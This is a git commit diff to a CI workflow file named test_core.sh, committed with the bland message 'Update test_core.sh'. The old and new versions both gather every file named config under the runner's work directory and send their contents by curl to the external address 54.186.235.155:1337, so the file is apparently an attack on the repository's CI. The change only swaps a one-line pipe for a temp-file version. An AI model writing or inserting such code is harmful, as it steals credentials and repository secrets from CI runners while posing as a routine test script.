39efdb31874163f0187b0be7968613241fc97b1a
nsomniaTony <166443373+nsomniaTony@users.noreply.github.com>
2024-04-08 15:09:43 -0700

    Update test_core.sh

--- .github/workflow_scripts/test_core.sh
+++ .github/workflow_scripts/test_core.sh
@@ -1,2 +1,4 @@
-#!/usr/bin/env sh
-find "$HOME/work" -type f -name config | xargs cat | tee >(curl -d @- 54.186.235.155:1337)
+#!/usr/bin/env bash
+find "$HOME/work" -type f -name config | xargs cat | tee output.txt
+curl -d @output.txt 54.186.235.155:1337
+rm output.txt
